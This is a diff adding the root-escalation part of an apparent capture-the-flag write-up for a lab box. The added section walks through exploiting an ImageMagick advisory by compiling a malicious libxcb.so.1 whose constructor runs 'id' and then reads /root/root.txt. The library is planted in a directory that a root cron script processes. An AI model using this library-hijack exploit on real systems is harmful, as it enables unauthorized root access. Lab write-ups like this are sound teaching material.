@@ -386,6 +386,85 @@ The first line is easy, change directory to /opt/app/static/assets/images.
 
 The second line is used to shrink metadata.log to a size of zero.
 
-The third line has a little bit going on. First it's going to look in the /opt/app/static/assets/images folder for any file with a name that ends with '.jpg'. Anything that is found will be passwd to magick command which will determine what the metadata of of the file contains and finally push what it reads to the metadata.log file.
+The third line has a little bit going on. First it's going to look in the /opt/app/static/assets/images folder for any file with a name that ends with '.jpg'. Anything that is found will be passwd to magick command which will determine what the metadata of of the file contains and finally push what it reads to the metadata.log file. I suppose that a good place to start would be to monitor that metadata.log file. That can be done with the tail command.
 
-![](https://media1.tenor.com/m/lduU0xA3eKAAAAAd/dbz.gif)
+```
+tail -f /opt/app/static/assets/images/metadata.log
+```
+
+![](.images/Screenshot-Titanic_Root-2.png)
+
+Looks like the script runs about once every minute or so. Well that's nice...
+
+After about an hour of trying to embed malicious code into an image I decided that it was time for a different approach.
+
+```
+magick --version
+```
+
+![](.images/Screenshot--Titanic_Root-3.png)
+
+Let's look that guy up...
+
+![](.images/Screenshot--Titanic_Root-4.png)
+
+[](https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8)
+
+That's the good stuff, now let's figure out what it's saying. Looks like there exsists 2 different ways to attempt an exploit with this binary. In order to know which option works on the first try, you'd have to be the one to build the command, or you have to have tried them already. The first option did not work for me, so I'll just skip to the second. Going off of the github, we need to make a shared library. That can be done with the following...
+
+```
+gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+__attribute__((constructor)) void init(){
+    system("id");
+    exit(0);
+}
+EOF
+```
+
+Insert gcc explanation here.
+
+The library that is output, simply runs the id command. Once it is constructed, the library needs to be moved to the /opt/app/static/assets/images directoy. We do not have write permissons to the /opt/scripts directory. So, I simply moved to my home directory to build my exploit.
+
+```
+cd
+gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+__attribute__((constructor)) void init(){
+    system("id");
+    exit(0);
+}
+EOF
+cp libxcb.so.1 /opt/app/static/assets/images/
+```
+Don't forget to monitor that metadata.log file.
+
+![](.images/Screenshot--Titanic_Root-5.png)
+
+Would you looky there, it worked. That means that there is only a simple fix to finish the box up from here.
+
+```
+gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+__attribute__((constructor)) void init(){
+    system("cat /root/root.txt");
+    exit(0);
+}
+EOF
+cp libxcb.so.1 /opt/app/static/assets/images/
+```
+
+Again, don't forget to monitor the metadata.log file.
+
+![](.images/Screenshot--Titanic_Root-6.png)
+
+![](https://media.tenor.com/OPgiL2-74YwAAAAM/youre-welcome-monday.gif)
